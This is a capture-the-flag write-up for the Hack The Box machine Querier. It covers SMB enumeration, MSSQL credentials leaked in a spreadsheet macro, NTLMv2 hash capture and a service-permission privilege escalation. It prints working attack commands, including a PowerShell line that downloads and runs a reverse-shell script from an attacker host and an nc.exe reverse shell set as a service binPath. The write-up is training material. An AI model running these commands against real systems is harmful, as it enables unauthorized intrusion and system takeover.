+++
title = 'HTB - Querier'
date = '2025-03-26'
draft = false
weight = 3
+++

## Introduction

Querier is a mid-level Windows box focusing on information disclosure, capturing and cracking Net-NTLMv2 hashes, and weak service permissions. This is a great box for anyone looking to practice their enumeration and Windows priv esc skills. Okay, let's go!

![Querier](Querier/img/Querier.webp)  
Source: [Hackthebox](https://app.hackthebox.com/machines/175)

## Scanning/Enumeration

Let's kick things off by running a network scan using Nmap. I'll start with a simple scan just to get a feel for what is on this box.

```bash
nmap -T4 10.10.10.125
```

![Nmap](Querier/img/nmap.png)

Off the bat, we see there are 4 open ports we can start to probe. The order of enumeration is as follows:

**msrpc → netbios-ssn → microsoft-ds → ms-sql-s**

When it came to msrpc and netbios-ssn, I didn't find anything out of the ordinary, although keep in mind I didn't spend much time here. I used [Hacktricks](https://book.hacktricks.xyz/welcome/readme) as a reference for my enumeration.

Moving onto microsoft-ds on port 445, aka SMB.

```bash
smbclient -L \\\\10.10.10.125\\ -U "anonymous" -N
```

![SMB Shares](Querier/img/smb-shares.png)

Listing the shares, we see a share named 'Reports'. Let's access this share and see what we can gather.

We see there is an xlsm file, which is known to be the format for the popular Microsoft spreadsheet tool, Excel. Let's go ahead and download the file and see what information we can pull off from this Excel spreadsheet.

```bash
smbclient \\\\10.10.10.125\\Reports -U "anonymous" -N
get "Currency Volume Report.xlsm"
```

![SMB Reports](Querier/img/smb-reports.png)

Once downloaded, extract its contents with binwalk. This will create a new directory with the same name as the file except with `_` added to the front and `.extracted` added to the end.

```bash
binwalk -e "Currency Volume Report.xlsm"
```

Cd'ing into our newly created dir, `_Currency Volume Report.xlsm.extracted/xl`, we see a `vbaProject.bin` file. Since VBA or 'Visual Basic for Applications' is used to write macros for Microsoft Office documents, there could be some information disclosure within the macros of the file.

![Macro Contents](Querier/img/p1_1.png)

Running `strings` on the bin returns some interesting text, particularly the lines `"Uid=reporting"` and `"Pwd=PcwTWTHRwryjc$c6"` — these look to be credentials for the SQL server on port 1433 we saw earlier in our nmap scan.

## Foothold

After a closer look, we see that this spreadsheet has a macro that contains credentials for the user `reporting` and accesses the `volume` database. Using the same credentials, we can use the impacket-mssqlclient tool from Impacket to log onto the MSSQL server.

```bash
impacket-mssqlclient "reporting:PcwTWTHRwryjc\$c6@10.10.10.125" -db volume -windows-auth
```

![Foothold](Querier/img/foothold.png)

Attempting to enable the `xp_cmdshell` under the reporting user returns an error as we don't have the proper permissions. However, using **Responder** and the `xp_dirtree` command, we can instead capture the NTLMv2 password hash of the service account the MSSQL server is running under.

![Responder](Querier/img/responder.png)

Running this through hashcat will get us a matching hash with the password `corporate568`. Using these newly found credentials, we can access the MSSQL server under the `mssql-svc` service account. Under this new account, we now have the correct permissions to enable the `xp_cmdshell`. Once enabled, we will have code execution.

![MSSQL svc](Querier/img/mssql-svc.png)

Once enabled, we should have code execution and a quick `whoami` verifies that we do. From here, let's get a payload on this machine and pop a shell. I had the best luck with the [Invoke-PowershellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) by Nishang.

Download the script and start an HTTP server. In a separate window, start your preferred listener and run the following command.

```bash
xp_cmdshell powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString(\"http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1\");Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <PORT>"
```

If all goes well, we should have a shell as the user `mssql-svc`.

![Initial Shell](Querier/img/init-shell.png)

## System

For this machine, there are multiple paths we can take to get system. Looking at the permissions of our current user, we see that `SeImpersonatePrivilege` is enabled. If you are interested in this PE vector, check out this guide on [potato attacks](https://jlajara.gitlab.io/Potatoes_Windows_Privesc).

Instead, we will be abusing service permissions to overwrite the binPath of a privileged service. Let us begin by running [winPEAS](https://github.com/carlospolop/PEASS-ng). Upon examination, we see that the user `mssql-svc` has `AllAccess` permissions on the `UsoSvc` service.

![winPEAS](Querier/img/wp.png)

This service runs under the local system account. Thus, by changing the binPath to a malicious payload, we can spawn a system shell. Go ahead and set up another listener and run the following.

```bash
sc config usosvc binPath= "Path\to\nc.exe ATTACKER_IP PORT -e cmd.exe"
sc stop usosvc
sc start usosvc
```

Checking our handler, we see that we have a system shell.

![System Shell](Querier/img/system.png)

---

Overall, this was a great machine for beginners like myself as none of the attack vectors felt too complicated. Highly recommend this machine for anyone looking to brush up on Windows hacking.
